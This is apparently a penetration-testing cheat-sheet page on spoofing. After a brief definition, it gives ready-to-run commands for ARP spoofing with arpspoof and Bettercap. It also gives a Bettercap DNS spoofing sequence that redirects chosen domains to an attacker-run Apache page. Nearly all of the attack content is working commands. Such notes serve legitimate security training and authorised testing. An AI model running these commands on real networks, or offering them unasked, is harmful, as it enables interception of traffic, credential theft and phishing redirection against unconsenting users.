# Spoofing

## Spoofing

* Spoofing is the act of disguising a communication or identity so that it appears to be associated with a trusted, authorized source. Spoofing attacks can take many forms, from the common email spoofing attacks that are deployed in phishing campaigns to caller ID spoofing attacks that are often used to commit fraud.

### ARP Spoofing

ARP Spoofing consist on sending gratuitous **ARP Responses** to indicate that the IP of a machine has the MAC of our device. Then, **the victim will change the ARP table** and will contact our machine every time it wants to contact the IP spoofed.

<pre class="language-bash"><code class="lang-bash"><strong># arpspoof
</strong><strong>echo 1 > /proc/sys/net/ipv4/ip_forward
</strong>arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1

# Bettercap
arp.spoof on
set arp.spoof.targets &#x3C;IP> #Specific targets to ARP spoof (default=&#x3C;entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
</code></pre>

### DNS Spoofing

```bash
# Bettercap
set arp.spoof.fullduplex true
set arp.spoof.targets <IP's>
set dns.spoof.address <local IP>
set dns.spoof.all true
set dns.spoof.domains *.spoofeddomain.com, *.anotherdomain.com
arp.spoof on
net.sniff on
dns.spoof on
```

* Now set your web page with apache2 or whatever you want.

```
service apache2 start
echo "Hello there :}" > /var/www/html/index.html
```
